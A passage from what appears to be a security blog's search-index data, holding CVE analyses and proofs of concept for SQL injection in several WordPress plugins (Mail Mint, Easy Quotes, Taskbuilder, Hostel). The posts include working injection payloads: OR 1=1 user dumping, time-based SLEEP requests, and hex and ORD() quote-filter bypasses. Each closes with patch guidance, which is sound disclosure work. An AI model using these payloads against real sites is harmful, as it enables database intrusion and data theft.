is executed and returns a JSON response with formatted_users and total_users. ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit After analyzing the code, it’s clear that the selectedCourses parameter undergoes several transformations before being injected into the vulnerable SQL query — but the attacker still controls the value key. POST request using BurpSuite: A single key can be used to easily control the final SQL query. Get all user info The resulting query looks like this: SELECT user_id FROM wp_usermeta WHERE meta_key IN ('course_abc') OR 1=1 -- _access_from') GROUP BY user_id LIMIT 5 OFFSET 0 ') escapes the IN clause 1=1 is always true → returns all user IDs from wp_usermeta The rest of the function retrieves metadata for all returned users: $formatted_users = array_map( function ($user) { $user-\u003eusermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u003eID) ); return $user; }, $contacts ); ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-58604 vulnerability in the WordPress Mail Mint plugin (prior to version 1.18.6) originates from not using $wpdb-\u003eprepare() when executing SQL queries. Instead, user input was directly concatenated into the SQL statement — leading to a classic SQL Injection vulnerability. The patch now uses $wpdb-\u003eprepare() to safely construct SQL queries and mitigate this issue. Key takeaways: Always use $wpdb-\u003eprepare() when interacting with the WordPress database to prevent SQL Injection. Regularly update your plugins and perform security reviews to avoid exploitation. ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Mail Mint Plugin \u003c= 1.18.5 is Vulnerable to SQL Injection ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability exists in the Easy Quotes WordPress plugin prior to version 1.2.3. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Easy Quotes Plugin: v1.2.2 (vulnerable) and v1.2.3 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The application injects user-supplied data directly into an SQL query without appropriate protections, which leads to SQL Injection. ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file includes/quotes-data.php: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } The patch uses $wpdb-\u003eprepare() instead of concatenating user-supplied data directly into the query: private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff Many other functions were patched the same way, such as get_font_variant($family_id, $variant_id), get_font_variants($family), and get_fonts($category = -1). Although get_fonts_categories() was also updated, it does not accept user input and is thus not relevant to the SQLi issue: public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works We exploit the SQL Injection in the function get_family_data($family), and other functions are vulnerable in a similar manner. get_family_data() is a private function in the Quotes_Data class (the example below shows context): class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other functions public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() is called by get_family() and get_font_variants(); to find where these are used, search for get_family or get_font_variants. Search function The get_font_variants() function is invoked by rest_route_callback_font_variants() in the Quotes_Rest_Route class: class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other functions function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } The constructor of Quotes_Rest_Route uses add_action('rest_api_init', ...) to register endpoints with WordPress’s REST API system. The callback rest_route_callback_font_variants corresponds to the endpoint /wp-json/layart/v1/font-variants?family=family_name. If the family parameter is not provided, it defaults to Shadows Into Light. ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi We use a Boolean-based SQL Injection technique to test whether the family parameter is injectable. True request (example): When the injected condition evaluates to true, the query returns normally: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND '1'='1'; False request (example): When the injected condition is false, no results are returned: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND '1'='2'; ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name A prerequisite to dumping data is being able to extract a single character of the database name; once you can obtain one character, you can typically extract the rest. In my test environment the database name is wordpress, so the first character is w. First letter A payload checking SUBSTRING(DATABASE(),1,1)='w' returns data normally, confirming the first letter is w: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto' AND SUBSTRING(DATABASE(),1,1)='w'; ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability CVE-2025-26943 in the WordPress Easy Quotes plugin (versions prior to 1.2.3) is caused by concatenating user-supplied input directly into SQL queries instead of using prepared statements ($wpdb-\u003eprepare), which results in SQL Injection. The official patch replaces string concatenation with $wpdb-\u003eprepare, ensuring user input is safely handled. Key takeaways: Always use $wpdb-\u003eprepare() when interacting with the database in WordPress to prevent SQL Injection. Regularly update plugins and perform security checks to avoid becoming an attack target. ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection cheat sheet - PortSwigger WordPress Easy Quotes Plugin \u003c= 1.2.2 is vulnerable to SQL Injection ","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information. CVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare differences between the vulnerable version and the patched version. The clear difference is in the file includes/admin/projects/get_users.php. In version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection. Patch diff ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works File Architecture: General structure of the current file: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory. Search get users 👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook. WPPM_Admin constructor: final class WPPM_Admin { public function __construct() { // other actions add_action( 'wp_ajax_wppm_get_users', array($this,'wppm_get_users')); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook. wp_ajax_wppm_get_users is an Ajax hook name: wp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users(). 👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin. Ajax search The wppm_get_users action is the data part in the POST request handled by wppm_get_users(). The function is referenced in HTML attributes of the project feature: Create a new project Access that project Inspect code to locate wppm_get_users and see which actions call it Ajax inspect 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML. Model display ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+SLEEP(1)) Sqli success Response delay indicates a successful SQL Injection. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped. Send a boolean-based SQLi payload with the correct proj_id: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77). SUBSTRING(STRING,1,1) retrieves the first character. Here, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users. Res 1 Using HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used. Send a boolean-based SQLi payload with a wrong proj_id: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None. Res 2 👉 We successfully retrieved the first character of the database name using boolean-based SQLi: Correct proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax. The patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL. Key Takeaways: Prefer prepared statements ($wpdb-\u003eprepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Taskbuilder \u003c= 4.0.1 Vulnerable to SQL Injection ","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient. ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php Vulnerable version: if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } Patched version: if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'. Analysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context. ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works To inject, we need to identify the complete query used here: $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); The query resides in the default branch of the switch structure. All this logic belongs to the static manage() method of the WPHostelBookings class. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \"manage\" in the plugin folder. Search In the file models/hostel.php we have: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', \"unavailable\")); add_submenu_page('wphostel_options', __(\"Email Log\", 'wphostel'), __(\"Email Log\", 'wphostel'), $wphostel_caps, 'wphostel_emaillog', array('WPHostelHelp', \"email_log\")); add_submenu_page('wphostel_options', __(\"Help\", 'wphostel'), __(\"Help\", 'wphostel'), $wphostel_caps, 'wphostel_help', array('WPHostelHelp', \"index\")); } // another logic } Here: add_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example: // add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = '', $icon_url = '', $position = null); add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = ''); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); // array('WPHostelBookings', \"manage\")); =\u003e WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory. Search menu In the plugin root file hostel.php we have: add_action('admin_menu', array(\"WPHostel\", \"menu\")); // =\u003e callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi Request with BurpSuite: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026ob=tB.status,(SELECT+SLEEP(10))\u0026dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values. Detecting SQLi Result: the response time is delayed → SQL Injection succeeded. ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Dumping Data from the Database Bypass ' using ORD(): To dump database data we need to extract characters such as the first character of the database name. Because sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name. Dumping Data from the Database Bypass ' using Hex encoding (alternative) Besides ORD() we can use Hex encoding to bypass: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted. Bypass succeeds ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#dumping-data-from-the-database"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection. Key takeaways: sanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection Cheat Sheet – PortSwigger WordPress Hostel Plugin \u003c= 1.1.5.6 is vulnerable to SQL Injection - patchstack ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"collections":null,"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to easily create, manage, and customize websites and blogs. It is an open-source CMS, built on PHP and using either MySQL or MariaDB. Released in 2003, initially just for blogging, then evolved into a platform for building websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress: WordPress.com Hosting service provided by Automattic You just register an account, no installation needed Limited customization; advanced features require payment WordPress.org Open source, you download and install it on your own hosting/server Fully customizable: install plugins, themes, write code, and build any type of website ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#"},{"categories":["Web"],"collections":null,"content":"Ecosystem Core: the main CMS Plugins: add-on software that extends WordPress functionality with new features Themes: add-on software that defines the visual appearance and layout of a WordPress site ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:1:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#ecosystem"},{"categories":["Web"],"collections":null,"content":"Why WordPress Hacking? State of WordPress Security in 2024 ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:2:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#why-wordpress-hacking"},{"categories":["Web"],"collections":null,"content":"Most Popular Currently, more than 40% of websites worldwide run on 